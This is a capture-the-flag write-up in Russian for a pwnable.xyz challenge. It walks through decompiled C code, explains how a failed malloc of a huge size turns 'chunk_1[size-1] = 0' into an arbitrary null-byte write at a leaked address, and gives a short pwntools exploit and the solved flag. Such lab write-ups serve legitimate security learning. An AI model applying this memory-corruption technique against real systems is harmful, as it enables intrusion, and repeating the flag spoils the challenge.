Are you worthy to continue?
svc.pwnable.xyz : 30000
Author: [uafio](https://pwnable.xyz/user/2/)
[download](https://pwnable.xyz/redisfiles/challenge_21.gz)

Исходный код:
``` C
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  _QWORD *chunk; // rbx
  char *chunk_1; // rbp
  size_t size_1; // rdx
  size_t size; // [rsp+0h] [rbp-28h] BYREF
  __int64 canary; // [rsp+8h] [rbp-20h]

  canary = __readfsqword(0x28u);
  set_buf();

  puts("Welcome.");


  chunk = malloc(0x40000u);
  *chunk = 1;
  _printf_chk(1, "Leak: %p\n");


  _printf_chk(1, "Length of your message: ");
  size = 0;
  _isoc99_scanf("%lu", &size);

  chunk_1 = malloc(size);
  _printf_chk(1, "Enter your message: ");
  read(0, chunk_1, size);

  size_1 = size;
  chunk_1[size - 1] = 0;
  write(1, chunk_1, size_1);

  if ( !*chunk )
    system("cat /flag");
}
```

На самом деле `chunk_1[size - 1] = 0` работает как `*(chunk_1+size-1) = 0`, поэтому если не получится выделить чанк `chunk_1`, то можно записать данные по любому адресу. Чтобы `chunk_1` не смог выделиться необходимо указать очень большое число, например `leak_addr-1`, тогда `*(chunk_1+size-1) = 0` запишет в `chunk` то, что мне нужно (`0`).

Эксплоит:
``` python
io = start()

io.recvuntil(b': ')
leak = int(io.recvline()[:-1].decode(), 16)

io.sendlineafter(b': ', str(leak+1).encode())
io.sendlineafter(b': ', b'0')

io.interactive()
```

Запуск:
![](../../../z.%20Images/Pasted%20image%2020261007190022.png)

Ответ: `FLAG{did_you_really_need_a_script_to_solve_this_one?}`